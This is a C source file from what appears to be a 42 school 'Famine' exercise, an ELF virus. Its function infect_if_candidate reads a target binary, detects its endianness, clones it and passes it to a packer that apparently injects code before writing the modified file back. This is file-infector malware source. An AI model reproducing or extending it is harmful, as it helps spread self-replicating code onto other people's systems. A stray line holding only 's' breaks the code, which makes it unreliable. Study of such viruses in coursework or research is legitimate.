/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/05 01:13:08 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/stat.h>
#include "infect.h"

static inline void	set_endian(struct endians_pointer *endians, bool big_mode)
{
	uint16_t	(*mode_2[])(uint16_t) =
	{
		endian_2_noswap,
		endian_2_swap
	};
	uint32_t	(*mode_4[])(uint32_t) =
	{
		endian_4_noswap,
		endian_4_swap
	};
	uint64_t	(*mode_8[])(uint64_t) =
	{
		endian_8_noswap,
		endian_8_swap
	};

	endians->endian_2 = mode_2[big_mode];
	endians->endian_4 = mode_4[big_mode];
	endians->endian_8 = mode_8[big_mode];
}

inline void		infect_if_candidate(const char *file)
{
	int		fd = famine_open(file, O_RDONLY);
	if (fd < 0) return;

	unsigned char	e_ident[16];
	if (famine_read(fd, e_ident, 16) < 16) return;

	struct famine	food;
	set_endian(&food.endians, e_ident[EI_DATA] == ELFDATA2MSB);

	famine_close(fd);

	food.original_safe = read_file(file);
	if (food.original_safe.ptr == NULL) return;

	food.clone_safe = alloc_clone(food.original_safe.filesize);
	if (food.clone_safe.ptr == NULL) return;
s
	elf64_packer(food, food.original_safe.filesize);
	write_clone_file(food.clone_safe);

	free_clone(food.clone_safe);
	free_file(food.original_safe);
}
